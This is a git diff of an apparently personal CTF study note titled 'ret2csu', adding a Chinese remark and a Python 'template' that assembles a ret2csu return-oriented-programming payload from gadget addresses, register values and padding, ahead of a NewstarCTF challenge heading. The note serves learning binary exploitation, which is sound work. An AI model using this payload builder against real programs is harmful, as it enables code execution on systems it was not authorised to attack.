@@ -1,8 +1,30 @@
 ---
 title: ret2csu
 date: '2025-03-13 16:54:45'
-updated: '2025-05-11 14:06:35'
+updated: '2025-09-20 17:23:50'
 ---
+![](/images/67cc281329893dd25e64478fb5b19133.png)
+
+csu1是从pop指令开始
+
+板子：
+
+```python
+def csu(rbx, rbp, r12, r13, r14, r15):
+    # pop rbx, rbp, r12, r13, r14, r15
+    # rbx = 0
+    # rbp = 1, enable not to jump
+    # r12 should be the function that you want to call
+    # rdi = edi = r13d
+    # rsi = r14
+    # rdx = r15
+    payload = p64(csu1)
+    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu2)
+    payload += b'a' * 0x38
+    return payload
+```
+
 ## NewstarCTF My_GBC!!!!!
 ![](/images/d884f7b65265ebe333d3de0b69adaf8d.png)
 
